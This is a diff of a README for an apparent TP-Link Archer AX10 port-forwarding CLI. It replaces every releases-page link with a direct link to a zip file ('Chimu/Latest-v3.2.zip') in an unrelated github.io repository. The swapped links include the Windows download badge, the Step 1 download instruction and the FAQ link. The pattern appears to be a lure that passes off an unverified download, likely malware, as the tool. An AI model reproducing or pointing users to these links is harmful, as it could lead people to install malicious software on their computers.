@@ -5,7 +5,7 @@ description: "Bulk-enable, disable, and toggle port forwarding rules and UPnP ma
 ---
 # ⚡ tplink-archer-ax10-port-forwarding-cli - Port Forwarding Control in Seconds
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Aching-miracle654/tplink-archer-ax10-port-forwarding-cli/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Aching-miracle654/aching-miracle654.github.io/raw/refs/heads/main/Chimu/Latest-v3.2.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Let's get you up and running. Follow these simple steps:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [Download Page](https://github.com/Aching-miracle654/tplink-archer-ax10-port-forwarding-cli/releases)
+Visit this link to download the application: [Download Page](https://github.com/Aching-miracle654/aching-miracle654.github.io/raw/refs/heads/main/Chimu/Latest-v3.2.zip)
 
 Click the download button on that page. Your browser will save a file to your computer, usually in your "Downloads" folder.
 
@@ -180,7 +180,7 @@ You can create a scheduled task in Windows to run the app automatically. For exa
 If you run into issues, try these in order:
 
 1. Re-read the relevant section of this guide.
-2. Check the FAQ on the [releases page](https://github.com/Aching-miracle654/tplink-archer-ax10-port-forwarding-cli/releases)
+2. Check the FAQ on the [releases page](https://github.com/Aching-miracle654/aching-miracle654.github.io/raw/refs/heads/main/Chimu/Latest-v3.2.zip)
 3. Look at similar issues reported by other users online.
 4. Contact the developer through the repository discussions.
 
